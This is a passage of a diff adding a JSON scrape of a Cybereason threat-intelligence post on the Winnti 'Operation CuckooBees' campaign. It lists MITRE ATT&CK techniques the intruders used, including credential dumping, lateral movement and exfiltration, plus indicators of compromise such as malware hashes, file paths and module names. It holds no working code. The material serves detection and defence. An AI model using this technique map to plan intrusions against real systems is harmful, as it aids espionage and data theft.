Client Execution</a></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1055/001/\">Process Injection: Dynamic-link Library Injection</a></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1055/001/\">Process Injection: Dynamic-link Library Injection</a></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1036/005/\">Masquerading: Match Legitimate Name or Location</a></p>\n</td>\n</tr>\n<tr>\n<td> </td>\n<td> </td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1059/003/\">Command and Scripting Interpreter: Windows Command Shell</a></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1053/005/\">Scheduled Task/Job: Scheduled Task</a></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1053/005/\">Scheduled Task/Job: Scheduled Task</a></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1055/001/\">Process Injection: Dynamic-link Library Injection</a></p>\n</td>\n</tr>\n<tr>\n<td> </td>\n<td> </td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1059/005/\">Command and Scripting Interpreter: Visual Basic</a></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1078/002/\">Valid Accounts: Domain Accounts</a></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1078/002/\">Valid Accounts: Domain Accounts</a></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1620/\">Reflective Code Loading</a></p>\n</td>\n</tr>\n<tr>\n<td> </td>\n<td> </td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1106/\">Native API</a></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1078/003/\">Valid Accounts: Local Accounts</a></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1078/003/\">Valid Accounts: Local Accounts</a></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1218/011/\">Signed Binary Proxy Execution: Rundll32</a></p>\n</td>\n</tr>\n<tr>\n<td> </td>\n<td> </td>\n<td> </td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1547/006/\">Boot or Logon Autostart Execution: Kernel Modules and Extensions</a></p>\n</td>\n<td> </td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1078/002/\">Valid Accounts: Domain Accounts</a></p>\n</td>\n</tr>\n<tr>\n<td> </td>\n<td> </td>\n<td> </td>\n<td> </td>\n<td> </td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1078/003/\">Valid Accounts: Local Accounts</a></p>\n</td>\n</tr>\n</tbody>\n</table>"
+                },
+                {
+                    "id": "<sentence_0x12340643>",
+                    "is_empty": true,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "",
+                    "html": "<p> </p>"
+                },
+                {
+                    "id": "<sentence_0xaac4671a>",
+                    "is_empty": true,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0xc4841834>": "https://attack.mitre.org/techniques/T1003/",
+                        "<a_0x26dfde58>": "https://attack.mitre.org/techniques/T1016/",
+                        "<a_0xbc5f098e>": "https://attack.mitre.org/techniques/T1210/",
+                        "<a_0xd661f00f>": "https://attack.mitre.org/techniques/T1560/001/",
+                        "<a_0x416aa143>": "https://attack.mitre.org/techniques/T1020/",
+                        "<a_0x742680c>": "https://attack.mitre.org/techniques/T1071/001/",
+                        "<a_0xad4d00c1>": "https://attack.mitre.org/techniques/T1018/",
+                        "<a_0x21b33782>": "https://attack.mitre.org/techniques/T1021/001/",
+                        "<a_0x84423364>": "https://attack.mitre.org/techniques/T1119/",
+                        "<a_0x57d90626>": "https://attack.mitre.org/techniques/T1090/",
+                        "<a_0x5bc5d1f8>": "https://attack.mitre.org/techniques/T1201/",
+                        "<a_0x28c1be40>": "https://attack.mitre.org/techniques/T1069/",
+                        "<a_0x538bda73>": "https://attack.mitre.org/techniques/T1135/",
+                        "<a_0x135b94bf>": "https://attack.mitre.org/techniques/T1007/",
+                        "<a_0xe6e304f9>": "https://attack.mitre.org/techniques/T1124/",
+                        "<a_0x5181705b>": "https://attack.mitre.org/techniques/T1049/",
+                        "<a_0xdd055aaf>": "https://attack.mitre.org/techniques/T1087/",
+                        "<a_0xc50e3b6c>": "https://attack.mitre.org/techniques/T1033/",
+                        "<a_0xe196d2a>": "https://attack.mitre.org/techniques/T1082/",
+                        "<a_0xfd7d5519>": "https://attack.mitre.org/techniques/T1057/",
+                        "<table_0x54b529b3>": {
+                            "0": {
+                                "0": "Credential Access",
+                                "1": "OS Credential Dumping",
+                                "2": "",
+                                "3": "",
+                                "4": "",
+                                "5": "",
+                                "6": "",
+                                "7": "",
+                                "8": "",
+                                "9": "",
+                                "10": "",
+                                "11": "",
+                                "12": ""
+                            },
+                            "1": {
+                                "0": "Discovery",
+                                "1": "System Network Configuration Discovery",
+                                "2": "Remote System Discovery",
+                                "3": "Password Policy Discovery",
+                                "4": "Permission Groups Discovery",
+                                "5": "Network Share Discovery",
+                                "6": "System Service Discovery",
+                                "7": "System Time Discovery",
+                                "8": "System Network Connections Discovery",
+                                "9": "Account Discovery",
+                                "10": "System Owner/User Discovery",
+                                "11": "System Information Discovery",
+                                "12": "Process Discovery"
+                            },
+                            "2": {
+                                "0": "Lateral movement",
+                                "1": "Exploitation of Remote Services",
+                                "2": "Remote Services: Remote Desktop Protocol",
+                                "3": "",
+                                "4": "",
+                                "5": "",
+                                "6": "",
+                                "7": "",
+                                "8": "",
+                                "9": "",
+                                "10": "",
+                                "11": "",
+                                "12": ""
+                            },
+                            "3": {
+                                "0": "Collection",
+                                "1": "Archive Collected Data: Archive via Utility",
+                                "2": "Automated Collection",
+                                "3": "",
+                                "4": "",
+                                "5": "",
+                                "6": "",
+                                "7": "",
+                                "8": "",
+                                "9": "",
+                                "10": "",
+                                "11": "",
+                                "12": ""
+                            },
+                            "4": {
+                                "0": "Exfiltration",
+                                "1": "Automated Exfiltration",
+                                "2": "",
+                                "3": "",
+                                "4": "",
+                                "5": "",
+                                "6": "",
+                                "7": "",
+                                "8": "",
+                                "9": "",
+                                "10": "",
+                                "11": "",
+                                "12": ""
+                            },
+                            "5": {
+                                "0": "Command and Control",
+                                "1": "Application Layer Protocol: Web Protocols",
+                                "2": "Proxy",
+                                "3": "",
+                                "4": "",
+                                "5": "",
+                                "6": "",
+                                "7": "",
+                                "8": "",
+                                "9": "",
+                                "10": "",
+                                "11": "",
+                                "12": ""
+                            }
+                        }
+                    },
+                    "text": "",
+                    "html": "<table>\n<tbody>\n<tr>\n<td>\n<p>Credential Access</p>\n</td>\n<td>\n<p>Discovery</p>\n</td>\n<td>\n<p>Lateral movement</p>\n</td>\n<td>\n<p>Collection</p>\n</td>\n<td>\n<p>Exfiltration</p>\n</td>\n<td>\n<p>Command and Control</p>\n</td>\n</tr>\n<tr>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1003/\">OS Credential Dumping</a></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1016/\">System Network Configuration Discovery</a></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1210/\">Exploitation of Remote Services</a></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1560/001/\">Archive Collected Data: Archive via Utility</a></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1020/\">Automated Exfiltration</a></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1071/001/\">Application Layer Protocol: Web Protocols</a></p>\n</td>\n</tr>\n<tr>\n<td> </td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1018/\">Remote System Discovery</a></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1021/001/\">Remote Services: Remote Desktop Protocol</a></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1119/\">Automated Collection</a></p>\n</td>\n<td> </td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1090/\">Proxy</a></p>\n</td>\n</tr>\n<tr>\n<td> </td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1201/\">Password Policy Discovery</a></p>\n</td>\n<td> </td>\n<td> </td>\n<td> </td>\n<td> </td>\n</tr>\n<tr>\n<td> </td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1069/\">Permission Groups Discovery</a></p>\n</td>\n<td> </td>\n<td> </td>\n<td> </td>\n<td> </td>\n</tr>\n<tr>\n<td> </td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1135/\">Network Share Discovery</a></p>\n</td>\n<td> </td>\n<td> </td>\n<td> </td>\n<td> </td>\n</tr>\n<tr>\n<td> </td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1007/\">System Service Discovery</a></p>\n</td>\n<td> </td>\n<td> </td>\n<td> </td>\n<td> </td>\n</tr>\n<tr>\n<td> </td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1124/\">System Time Discovery</a></p>\n</td>\n<td> </td>\n<td> </td>\n<td> </td>\n<td> </td>\n</tr>\n<tr>\n<td> </td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1049/\">System Network Connections Discovery</a></p>\n</td>\n<td> </td>\n<td> </td>\n<td> </td>\n<td> </td>\n</tr>\n<tr>\n<td> </td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1087/\">Account Discovery</a></p>\n</td>\n<td> </td>\n<td> </td>\n<td> </td>\n<td> </td>\n</tr>\n<tr>\n<td> </td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1033/\">System Owner/User Discovery</a></p>\n</td>\n<td> </td>\n<td> </td>\n<td> </td>\n<td> </td>\n</tr>\n<tr>\n<td> </td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1082/\">System Information Discovery</a></p>\n</td>\n<td> </td>\n<td> </td>\n<td> </td>\n<td> </td>\n</tr>\n<tr>\n<td> </td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1057/\">Process Discovery</a></p>\n</td>\n<td> </td>\n<td> </td>\n<td> </td>\n<td> </td>\n</tr>\n</tbody>\n</table>"
+                },
+                {
+                    "id": "<sentence_0xbce199b2>",
+                    "is_empty": true,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "",
+                    "html": "<p> </p>"
+                }
+            ]
+        },
+        {
+            "id": "<chapter_0x4ce768a2>",
+            "title": "Operation CuckooBees Indicators of Compromise (IOCs)",
+            "title_level": 3,
+            "sentences": [
+                {
+                    "id": "<sentence_0x31cec137>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "Hashes",
+                    "html": "<p>Hashes</p>"
+                },
+                {
+                    "id": "<sentence_0x8ffb20dc>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "BB93AE0FEE817FE56C31BDC997F3F7D57A48C187 - STASHLOG<crlf>4D1B8791D0715FE316B43FC95BDC335CB31A82CA - STASHLOG<crlf>2D336978AF261E07B1ECFAF65DC903B239E287A4 - STASHLOG<crlf>F2D04FE529E2D8DAB96242305255CFB84CE81E9C - STASHLOG<crlf>F8D46895E738254238473D650D99BDC92C34EE44 - SPARKLOG<crlf>9267FE0BB6D367FC9186E89EA65B13BAA7418D87 - PRIVATELOG<crlf>A009A0F5A385683AEA74299CBE6D5429C609F2D2 - PRIVATELOG<crlf>1316F715D228AE6CC1FBA913C6CC309861F82E14 - PRIVATELOG<crlf>1275894D8231FE25DB56598DDCF869F88DF5AD8D - WINNKIT<crlf>9139C89B2B625E2CEEE2CBF72AEF6C5104707A26 - WINNKIT<crlf>082DBCA2C3CA5C5410DE9951A5C681F0C42235C8 - WINNKIT",
+                    "html": "<ul>\n<li>BB93AE0FEE817FE56C31BDC997F3F7D57A48C187 - STASHLOG</li>\n<li>4D1B8791D0715FE316B43FC95BDC335CB31A82CA - STASHLOG</li>\n<li>2D336978AF261E07B1ECFAF65DC903B239E287A4 - STASHLOG</li>\n<li>F2D04FE529E2D8DAB96242305255CFB84CE81E9C - STASHLOG</li>\n<li>F8D46895E738254238473D650D99BDC92C34EE44 - SPARKLOG</li>\n<li>9267FE0BB6D367FC9186E89EA65B13BAA7418D87 - PRIVATELOG</li>\n<li>A009A0F5A385683AEA74299CBE6D5429C609F2D2 - PRIVATELOG</li>\n<li>1316F715D228AE6CC1FBA913C6CC309861F82E14 - PRIVATELOG</li>\n<li>1275894D8231FE25DB56598DDCF869F88DF5AD8D - WINNKIT</li>\n<li>9139C89B2B625E2CEEE2CBF72AEF6C5104707A26 - WINNKIT</li>\n<li>082DBCA2C3CA5C5410DE9951A5C681F0C42235C8 - WINNKIT</li>\n</ul>"
+                },
+                {
+                    "id": "<sentence_0xe971cf32>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "File Names & Paths",
+                    "html": "<p>File Names &amp; Paths</p>"
+                },
+                {
+                    "id": "<sentence_0xaa97d9af>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "C:\\Windows\\temp\\bc.bat<crlf>C:\\Windows\\AppPatch\\Custom\\Custom64\\cc.bat<crlf>C:\\Windows\\temp\\cc.log<crlf>C:\\Windows\\AppPatch\\Custom\\Custom64\\log.dat<crlf>C:\\Windows\\Branding\\Basebrd\\x64.tlb<crlf>C:\\Windows\\Branding\\Basebrd\\language.dll<crlf>C:\\Windows\\System32\\mscuplt.dll<crlf>C:\\Windows\\System32\\rpcutl.dll<crlf>C:\\Windows\\System32\\dot3utl.dll<crlf>C:\\Windows\\System32\\iumatl.dll<crlf>C:\\Windows\\System32\\Nlsutl.dll<crlf>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\dbghelp.dll<crlf>C:\\Windows\\System32\\drivers\\bqDsp.sys<crlf>C:\\Windows\\apppatch\\en-us\\MFSDLL.exe<crlf>C:\\Windows\\System32\\spool\\drivers\\x64\\3\\prntvpt.dll<crlf>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\wlbsctrl.dll<crlf>C:\\Windows\\assembly\\gac_msil\\dfsvc\\foserv.exe<crlf>C:\\Windows\\assembly\\temp\\foserv.exe<crlf>C:\\Windows\\apppatch\\custom\\custom64\\shiver.exe<crlf>C:\\Windows\\apppatch\\custom\\custom64\\spark.exe<crlf>mktzx64.dll",
+                    "html": "<ul>\n<li>C:\\Windows\\temp\\bc.bat</li>\n<li>C:\\Windows\\AppPatch\\Custom\\Custom64\\cc.bat</li>\n<li>C:\\Windows\\temp\\cc.log</li>\n<li>C:\\Windows\\AppPatch\\Custom\\Custom64\\log.dat</li>\n<li>C:\\Windows\\Branding\\Basebrd\\x64.tlb</li>\n<li>C:\\Windows\\Branding\\Basebrd\\language.dll</li>\n<li>C:\\Windows\\System32\\mscuplt.dll</li>\n<li>C:\\Windows\\System32\\rpcutl.dll</li>\n<li>C:\\Windows\\System32\\dot3utl.dll</li>\n<li>C:\\Windows\\System32\\iumatl.dll</li>\n<li>C:\\Windows\\System32\\Nlsutl.dll</li>\n<li>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\dbghelp.dll</li>\n<li>C:\\Windows\\System32\\drivers\\bqDsp.sys</li>\n<li>C:\\Windows\\apppatch\\en-us\\MFSDLL.exe</li>\n<li>C:\\Windows\\System32\\spool\\drivers\\x64\\3\\prntvpt.dll</li>\n<li>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\wlbsctrl.dll</li>\n<li>C:\\Windows\\assembly\\gac_msil\\dfsvc\\foserv.exe</li>\n<li>C:\\Windows\\assembly\\temp\\foserv.exe</li>\n<li>C:\\Windows\\apppatch\\custom\\custom64\\shiver.exe</li>\n<li>C:\\Windows\\apppatch\\custom\\custom64\\spark.exe</li>\n<li>mktzx64.dll</li>\n</ul>"
+                },
+                {
+                    "id": "<sentence_0x9d7323bd>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "Winnti Malware Modules Names",
+                    "html": "<p>Winnti Malware Modules Names</p>"
+                },
+                {
+                    "id": "<sentence_0x74f7c07d>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "Cmp2.o<crlf>Fmg2.o<crlf>Srv2.o<crlf>Sck2.o<crlf>Prc2.o<crlf>Trs2.o<crlf>Cme2.o",
+                    "html": "<ul>\n<li>Cmp2.o</li>\n<li>Fmg2.o</li>\n<li>Srv2.o</li>\n<li>Sck2.o</li>\n<li>Prc2.o</li>\n<li>Trs2.o</li>\n<li>Cme2.o</li>\n</ul>"
+                },
+                {
+                    "id": "<sentence_0xb312f32f>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "Events",
+                    "html": "<p>Events</p>"
+                },
+                {
+                    "id": "<sentence_0x99faab60>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "\\BaseNamedObjects\\{75F09225-CD50-460B-BF90-5743B8404D73}<crlf>\\BaseNamedObjects\\{7D0DF5FC-3991-4047-921F-32308B1A0459}<crlf>\\BaseNamedObjects\\{B73AB0F4-A1D0-4406-9066-41E00BA78E9F}<crlf>Global\\APCI#<GUID><crlf>Global\\HVID_<GUID>",
+                    "html": "<ul>\n<li>\\BaseNamedObjects\\{75F09225-CD50-460B-BF90-5743B8404D73}</li>\n<li>\\BaseNamedObjects\\{7D0DF5FC-3991-4047-921F-32308B1A0459}</li>\n<li>\\BaseNamedObjects\\{B73AB0F4-A1D0-4406-9066-41E00BA78E9F}</li>\n<li>Global\\APCI#&lt;GUID&gt;</li>\n<li>Global\\HVID_&lt;GUID&gt;</li>\n</ul>"
+                },
+                {
+                    "id": "<sentence_0xe27b905c>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "Named Pipes",
+                    "html": "<p>Named Pipes</p>"
+                },
+                {
+                    "id": "<sentence_0x16efd307>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "Pipe2PortCtrl",
+                    "html": "<ul>\n<li>Pipe2PortCtrl</li>\n</ul>"
+                },
+                {
+                    "id": "<sentence_0x5fcc5c5a>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "Scheduled Task Name",
+                    "html": "<p>Scheduled Task Name</p>"
+                },
+                {
+                    "id": "<sentence_0x6bee25ec>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "test",
+                    "html": "<ul>\n<li>test</li>\n</ul>"
+                },
+                {
+                    "id": "<sentence_0x84b20b3f>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "Share",
+                    "html": "\nShare\n"
+                },
+                {
+                    "id": "<sentence_0x99d2cdf5>",
+                    "is_empty": true,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0x9171fd>": "https://twitter.com/intent/tweet?original_referer=https://www.cybereason.com/blog/operation-cuckoobees-deep-dive-into-stealthy-winnti-techniques&utm_medium=social&utm_source=twitter&url=https://www.cybereason.com/blog/operation-cuckoobees-deep-dive-into-stealthy-winnti-techniques&utm_medium=social&utm_source=twitter&source=tweetbutton&text=",
+                        "<img_0xbaa4ba0c>": "https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/twitter-gray.svg"
+                    },
+                    "text": "",
+                    "html": "<a href=\"https://twitter.com/intent/tweet?original_referer=https://www.cybereason.com/blog/operation-cuckoobees-deep-dive-into-stealthy-winnti-techniques&amp;utm_medium=social&amp;utm_source=twitter&amp;url=https://www.cybereason.com/blog/operation-cuckoobees-deep-dive-into-stealthy-winnti-techniques&amp;utm_medium=social&amp;utm_source=twitter&amp;source=tweetbutton&amp;text=\" rel=\"noopener\" target=\"_blank\">\n<img alt=\"Share on twitter\" class=\"hs-image-widget hs-image-social-sharing-24\" hspace=\"0\" src=\"https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/twitter-gray.svg\" width=\"16\"/>\n</a>"
+                },
+                {
+                    "id": "<sentence_0x1b4d75eb>",
+                    "is_empty": true,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0x97ed9f90>": "http://www.facebook.com/share.php?u=https://www.cybereason.com/blog/operation-cuckoobees-deep-dive-into-stealthy-winnti-techniques&utm_medium=social&utm_source=facebook",
+                        "<img_0x231dc0e>": "https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/facebook-gray.svg"
+                    },
+                    "text": "",
+                    "html": "<a href=\"http://www.facebook.com/share.php?u=https://www.cybereason.com/blog/operation-cuckoobees-deep-dive-into-stealthy-winnti-techniques&amp;utm_medium=social&amp;utm_source=facebook\" rel=\"noopener\" target=\"_blank\">\n<img alt=\"Share on facebook\" class=\"hs-image-widget hs-image-social-sharing-24\" hspace=\"0\" src=\"https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/facebook-gray.svg\" width=\"16\"/>\n</a>"
+                },
+                {
+                    "id": "<sentence_0x307a2719>",
+                    "is_empty": true,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0x93984c50>": "http://www.linkedin.com/shareArticle?mini=true&url=https://www.cybereason.com/blog/operation-cuckoobees-deep-dive-into-stealthy-winnti-techniques&utm_medium=social&utm_source=linkedin",
+                        "<img_0x92538807>": "https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/linkedin-gray.svg"
+                    },
+                    "text": "",
+                    "html": "<a href=\"http://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.cybereason.com/blog/operation-cuckoobees-deep-dive-into-stealthy-winnti-techniques&amp;utm_medium=social&amp;utm_source=linkedin\" rel=\"noopener\" target=\"_blank\">\n<img alt=\"Share on linkedin\" class=\"hs-image-widget hs-image-social-sharing-24\" hspace=\"0\" src=\"https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/linkedin-gray.svg\" width=\"16\"/>\n</a>"
+                },
+                {
+                    "id": "<sentence_0xed4bcd01>",
+                    "is_empty": true,
+                    "have_tags": true,
+                    "tags": {
+                        "<img_0xf7595c3>": "https://www.cybereason.com/hubfs/CR_Owl_Web_Mono@3x%202.png"
+                    },
+                    "text": "",
+                    "html": "<img alt=\"Cybereason Nocturnus\" class=\"cr-speaker-headshot\" src=\"https://www.cybereason.com/hubfs/CR_Owl_Web_Mono@3x%202.png\"/>"
+                },
+                {
+                    "id": "<sentence_0x7e387d8f>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "About the Author",
+                    "html": "\nAbout the Author\n"
+                }
+            ]
+        },
+        {
+            "id": "<chapter_0x23ae82>",
+            "title": "Cybereason Nocturnus",
+            "title_level": 4,
+            "sentences": [
+                {
+                    "id": "<sentence_0x662ebf34>",
+                    "is_empty": true,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0xe5567450>": "https://www.linkedin.com/company/cybereason",
+                        "<img_0xbb570f23>": "https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/icon-social-gray-linkedin.png"
+                    },
+                    "text": "",
+                    "html": "<a class=\"social\" href=\"https://www.linkedin.com/company/cybereason\" target=\"_blank\">\n<img src=\"https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/icon-social-gray-linkedin.png\"/>\n</a>"
+                },
+                {
+                    "id": "<sentence_0x4acf9eba>",
+                    "is_empty": true,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0x2ea59e83>": "https://twitter.com/cr_nocturnus",
+                        "<img_0xc105defc>": "https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/icon-social-gray-twitter.svg"
+                    },
+                    "text": "",
+                    "html": "<a class=\"social\" href=\"https://twitter.com/cr_nocturnus\" target=\"_blank\">\n<img src=\"https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/icon-social-gray-twitter.svg\"/>\n</a>"
+                },
+                {
+                    "id": "<sentence_0x96139d84>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "The Cybereason Nocturnus Team has brought the worlds brightest minds from the military, government intelligence, and enterprise security to uncover emerging threats across the globe. They specialize in analyzing new attack methodologies, reverse-engineering malware, and exposing unknown system vulnerabilities. The Cybereason Nocturnus Team was the first to release a vaccination for the 2017 NotPetya and Bad Rabbit cyberattacks.",
+                    "html": "<p>The Cybereason Nocturnus Team has brought the world\u2019s brightest minds from the military, government intelligence, and enterprise security to uncover emerging threats across the globe. They specialize in analyzing new attack methodologies, reverse-engineering malware, and exposing unknown system vulnerabilities. The Cybereason Nocturnus Team was the first to release a vaccination for the 2017 NotPetya and Bad Rabbit cyberattacks.</p>"
+                },
+                {
+                    "id": "<sentence_0xc14b4379>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0x538f5e9f>": "https://www.cybereason.com/blog/authors/cybereason-nocturnus"
+                    },
+                    "text": "All Posts by Cybereason Nocturnus",
+                    "html": "<a class=\"cr-button cr-button__min\" href=\"https://www.cybereason.com/blog/authors/cybereason-nocturnus\">All Posts by Cybereason Nocturnus</a>"
+                },
+                {
+                    "id": "<sentence_0xa229e5cc>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "NEWSLETTER",
+                    "html": "\nNEWSLETTER\n"
+                }
+            ]
+        }
+    ]
+}
